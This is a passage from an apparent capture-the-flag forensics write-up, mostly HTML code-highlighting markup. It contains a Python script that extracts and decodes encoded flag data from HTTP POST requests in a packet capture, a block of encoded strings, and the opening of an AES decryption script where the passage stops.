e:\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">                ascii_payload \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> hex_payload\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">        \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">        if\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"flag\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> in\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> decoded_url:\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">            post_data.append(\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">f\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">{\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">decoded_url\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">}\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> : \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">{\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">ascii_payload\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">}\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">def\u003C/span>\u003Cspan style=\"--shiki-light:#622CBC;--shiki-dark:#DBB7FF\"> natural_sort_key\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(s):\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    url_part \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> s.split(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\" : \"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)[\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">0\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    numbers \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> re.findall(\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">r\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">\\d\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">+\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">, url_part)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">    if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> numbers:\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">        number_idx \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> url_part.find(numbers[\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">0\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">])\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">        prefix \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> url_part[:number_idx]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">        number \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> int\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(numbers[\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">0\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">])\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">        suffix \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> url_part[number_idx \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">+\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> len\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(numbers[\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">0\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]):]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">        return\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (prefix, number, suffix)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">    return\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (url_part, \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">0\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">, \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">''\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">post_data.sort(\u003C/span>\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">key\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">natural_sort_key)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">output_file \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"decoded_output.txt\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">with\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> open\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(output_file, \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"w\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">, \u003C/span>\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">encoding\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"utf-8\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">as\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> f:\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">    for\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> data \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">in\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> post_data:\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">        data \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> data.strip().split(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\" : \"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">, \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">1\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)[\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">1\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">].strip() \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">        f.write(data \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">+\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">\\n\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"import base64\nimport binascii\nimport re\nimport pyshark\n\ndef reverse_decode(strings):\n    reversed_strings = strings[::-1]\n    replaced_strings = reversed_strings.replace(&#x22;-&#x22;, &#x22;C&#x22;).replace(&#x22;_&#x22;, &#x22;E&#x22;)\n    padding = len(replaced_strings) % 4\n    if padding:\n        replaced_strings += &#x22;=&#x22; * (4 - padding)\n    try:\n        decoded = base64.b64decode(replaced_strings)\n        return decoded.decode(&#x27;utf-8&#x27;, errors=&#x27;replace&#x27;)\n    except Exception as e:\n        print(f&#x22;Error decoding URL: {e}&#x22;)\n        return &#x22;&#x22;\n\ncap = pyshark.FileCapture(&#x27;traffic.pcapng&#x27;, display_filter=&#x27;http.request.method == POST&#x27;)\npost_data = []\n\nfor packet in cap:\n    if hasattr(packet, &#x27;http&#x27;):\n        url_part = packet.http.request_uri.split(&#x27;/&#x27;)[-1]\n        decoded_url = reverse_decode(url_part)\n        hex_payload = packet.http.file_data if &#x27;file_data&#x27; in packet.http.field_names else &#x22;&#x22;\n        ascii_payload = &#x22;&#x22;\n        \n        if hex_payload:\n            try:\n                cleaned_hex = hex_payload.replace(&#x22;:&#x22;, &#x22;&#x22;)\n                ascii_payload = binascii.unhexlify(cleaned_hex).decode(&#x27;ascii&#x27;)\n            except Exception as e:\n                ascii_payload = hex_payload\n        \n        if &#x22;flag&#x22; in decoded_url:\n            post_data.append(f&#x22;{decoded_url} : {ascii_payload}&#x22;)\n\ndef natural_sort_key(s):\n    url_part = s.split(&#x22; : &#x22;)[0]\n    numbers = re.findall(r&#x27;\\d+&#x27;, url_part)\n    if numbers:\n        number_idx = url_part.find(numbers[0])\n        prefix = url_part[:number_idx]\n        number = int(numbers[0])\n        suffix = url_part[number_idx + len(numbers[0]):]\n        return (prefix, number, suffix)\n    return (url_part, 0, &#x27;&#x27;)\n\npost_data.sort(key=natural_sort_key)\n\n\noutput_file = &#x22;decoded_output.txt&#x22;\nwith open(output_file, &#x22;w&#x22;, encoding=&#x22;utf-8&#x22;) as f:\n    for data in post_data:\n        data = data.strip().split(&#x22; : &#x22;, 1)[1].strip() \n        f.write(data + &#x22;\\n&#x22;)\n\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003Cp>This script decodes all URLs and payloads from HTTP POST requests in the \u003Ccode>.pcapng\u003C/code> file. It specifically extracts and decodes data related to flag files, then sorts them by number and saves the results to \u003Ccode>output.txt\u003C/code>. Thanks ChatGPT\u003C/p>\n\u003Cpre>\u003Ccode>0NaXoN6fZexANHcU0Q+PtJtipYzI1MWcVGsKGQGi4v/\r\nIz8pc9b88c1mOQHmc1hH5+xRDVFsPzL___qz1F-L724\r\nIAjJSPH1fgXSn659HaDJu9Tdob60WIocHOc1Kfa-IkY\r\novz+j4Q1GiLLxdVqoPWohve60Nr/3Lwqba0yYxPkQ/0\r\nsWpGT6d6xXQxdV2ZASbUUiMOgeKUyGJkzMHwsQNM-7T\r\n0h7yIaG-lmzfeSHpF/caBFusl8KRGnPLuYvWw4_o-zL\r\nIZlAZWhTVPnUB3yr9D11+JGlTNmIAYkg16bXjc_BWzs\r\nMzmqd+n3r0Vz/TpoaWHGLDcKndIzd9r-Oqw1t4TFcw7\r\nkUfLVO1h2r1R7c_a0A8lTDh1Q+g6KovyM5RtRVPd/Og\r\nAP6WHYj/iIeVJpLYXKZDjVLsWxyKbp1UGbApg8FeIzy\r\nsdbNtnSpme/IKsR8lnccrkrUQ8LnmG9Hre+ZPu9pzfI\r\nIPQButt+ZPszbfnFuxcwm8k7xsIW9UGyHa9ni/IHu0O\r\nUAOq1KVjPH2Wgewl8tyRwIhXLM-adWVTh0AjnTGUk-i\r\noX9rxi+jGLsyYqFZ6HXnZZw/QJod5Z+_QT9kPr_SjSf\r\n49gqimKu1B11q9h5bOOxybdxiSqwdN6YdOrPHGHf_e+\r\nMSsr5rHr6DGetJzYdi+-94kFFbBk+briOAm7s2OXpdu\r\nAt+eeUxAhPUl8K87Dihj1ca_z-aK7wtWm_kP0y4xewt\r\nISOWbQnQ9zmXmjRSpd6b1YGSdIH7/FX4q2dZSvgaUtv\r\nM7PI81by1P7N_O3cXaaVQZPf/-/+-TKNSYuuxWLrM++\r\noxyTKzWBhT3k6_DXdk8w/vdQqoNADs33+1uofd1ag85\r\n8ZM5IvDhvUe3oyorBcLNVGn8jHkeV1ugcw7YLkkrsOh\r\nIUABjgWWScWKL61QX6SL1ZInpgTraKhUlsnRwftK51w\r\nAjqTGzWp1NU_c3osnj5UiMqoSjyr+cWS1zRkPraXZia\r\ncVjuho2jDb52OThxF-x-hU4g/_f3UfcbnOjW4rV8/8B\r\nYY5ual0Zjw2LQRl3cMkqbXVRD/ccj8N1nKypZY+chbh\r\n_uDVjd009Xph0iNy5jFbZu-G+r9_VTWtd8bn/WmhHa1\r\noq45d7S6pe_Ow7WPz95_/ceoLpl7eTyTl-B+ukcaDzZ\r\nwfK8MdOj8TVV7URziByBOKeaAF6q-gSJisvJqur2bhc\r\nsAciFmeJz9eN-Tp9VXb4TVar_9Gb/72uGa/RVrh_IQu\r\n8Gd2ZYvnhuZS9sPs3zZ_QRAIPIixf9un046KTDzfA+L\r\nsZVwZ1WkJOb4o9uhLjAx58cMZ5VNggXTrDaywWuNwx2\r\nI4PPy59X8GiVHnU_a_saMvGWbqPMOiHpRwtY5kadUPF\r\n8cnQt_79-/l4G5I3UQs0eRUyoGB6rdSXlJe-ZLqiaj+\r\nMNojovs4bjD+_O0ReYV8B3tXWet/gGO9Vmv/h9TRI1M\r\n_6Apj84DodnhHXzs23taUK1Q5Xg4fNyhmsu00eKk0T3\r\nQm0g/vv0pGZKaOXOkNL73o4/-lMW3xVwFRDh9px8WRU\r\nMXzDZsAazbswbZQrBO8dGk_8+Ox-85rwOi_akbXkytd\r\nY95QY2ADl-Ma1JhiOO0xAW-iXXifoydMji4MIXdD6_q\r\n4WKyk6O_+-I5m_HIlmz_sWs5TS6rivrirGt/SmQreXh\r\nA/51-ZUiV5Rr-XXFWWmQVunUYp2FI26GWa5goTBnufo\r\n0-mzzX-WGHYXJ1Jzu1ZViOR/Z6coGsGIG+1RscRuy2j\r\n0LrHb8yls--qBcHxx6In3-nT7-0zDJYHtRZ8yQbYms4\r\nIuuPZrbgKeL+k6lHIBep7njjinpKa_Of-yuDoGAb8f0\r\nkXt8cBp/yuR+/000Y3McIOXuMV4/F73ODpsYFtBi96i\r\nYjluSk8L5xvmivpWb-LR2YHt_8dSh8M3TB7ps-UIh6Q\r\nYZH5Zwm57hf3GZcSDZgwg-wthUzJpGImB1wRH97B2h1\r\ngD4JPXlJJ0NqSiG57+p/opBLBPj1wk51SV8NNQozPha\r\nsnlwDu_2oZ1nJvV4SUzrjjNwnX_p0USQDFSAP7HviKZ\r\n454DgPfVhcb3pJpjLjxfAxtUHhngRGrvTYrzwM8m_1Y\r\n_k+mQ1N+HjeVRVVmHHy0IBs0bHsRbI_MLLJLKcjjZs4\r\n0sgM4yYBHYckscKzzgnkIQGVjXvS-5TeQ31YixBK1S1\r\n0D10/t/sx2ubSLesvfBpBHQ3IzANTKt36Gpza4gL175\r\nIvBGSaSNtyMb-dZMaKkbGAmuhMHMnTtctxgRjRORKy8\r\ncFDmohU81k2dQZRTh-WAhqU5KTfw2my0OdTI7v8sw2l\r\nU2Ny2Z2l8O6ydHHRc55wfksWP6K7wc0fagggW92zPYO\r\n4S4/i/2trkTDuaiZu6mMHDcxo+T/ixX08oSLRtqo/an\r\nI-Nygh527T+JZxrf3D1cciQtpttih6S59QB9w1_t02e\r\nIKu3_m5xI0ASe6efLJDOyHeKRf6NjnVVIi0/9FeOBeI\r\ngFcuLzU5jQwJBmAoUqDyTMO/7FO24dRLGbF4TsLgmKw\n\u003C/code>\u003C/pre>\n\u003Cp>Now we just need to decode this data to get our flag.\u003C/p>\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"python\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"python\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">import\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> base64\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">from\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> Crypto.Cipher \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">import\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> AES\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">from\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> Crypto.Hash \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">import\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> SHA256\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">def\u003C/span>\u003Cspan style=\"--shiki-light:#622CBC;--shiki-dark:#DBB7FF\"> reverse_decode\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(encoded_data):\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    reversed_data \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> encoded_data[::\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">1\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    replaced_data \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> reversed_data.replace(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'-'\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">, \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'C'\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">).replace(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'_'\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">, \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'E'\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    padding \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> 4\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">len\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(replaced_data) \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">%\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> 4\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">    if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> padding \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">&#x3C;\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> 4\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">:\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">        replaced_data \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">+=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> '='\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> *\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> padding\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">    return\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> replaced_data \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">def\u003C/span>\u003Cspan style=\"--shiki-light:#622CBC;--shiki-dark:#DBB7FF\"> aes_decrypt\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(encrypted_text, key):\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    key_hash \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> SHA256\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">.new(key.encode(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'utf-8'\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)).digest()\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    encrypted_bytes 